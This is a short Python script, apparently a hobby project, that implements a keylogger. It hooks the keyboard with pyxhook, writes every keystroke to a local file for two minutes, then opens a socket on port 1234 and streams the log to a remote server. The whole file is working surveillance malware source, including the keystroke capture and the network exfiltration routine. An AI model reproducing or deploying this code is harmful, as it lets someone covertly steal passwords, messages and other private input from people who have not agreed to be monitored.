import pyxhook
from pynput.keyboard import Key, Controller
import socket
import time

# ------------------pyxhook is downloaded and kept along with the file
# ---------------------if required use command----> pip3 install pynput
# ------------------Press ` (below ESC key) to terminate the program

log_file='KL.txt'

#this function is called everytime a key is pressed.
def KeyPress(event):
  f = open(log_file,'a')
  f.write(event.Key)
  f.write('\n')

  if event.Ascii==96:   #96 is the ascii value of the grave key (`)
    f.close()
    new_hook.cancel()
    
def connection():
	s = socket.socket()             
	host = ''     			
	port = 1234                    
		
	s.connect((host, port))
	print('connected..')

	filename='./KL.txt'
	f = open(filename,'r')
	l = f.read(1024)
	while (l):
	   s.send(l)
	   print('Sent ',repr(l))
	   l = f.read(1024)
	f.close()
	print('\nDone sending. \n\nPress ctrl+Z to terminate this session and check server folder for log file')
	s.shutdown(1)
	s.close()
    
##MAIN

new_hook=pyxhook.HookManager()

new_hook.KeyDown=KeyPress

new_hook.HookKeyboard()

new_hook.start()

time.sleep(120)
connection()





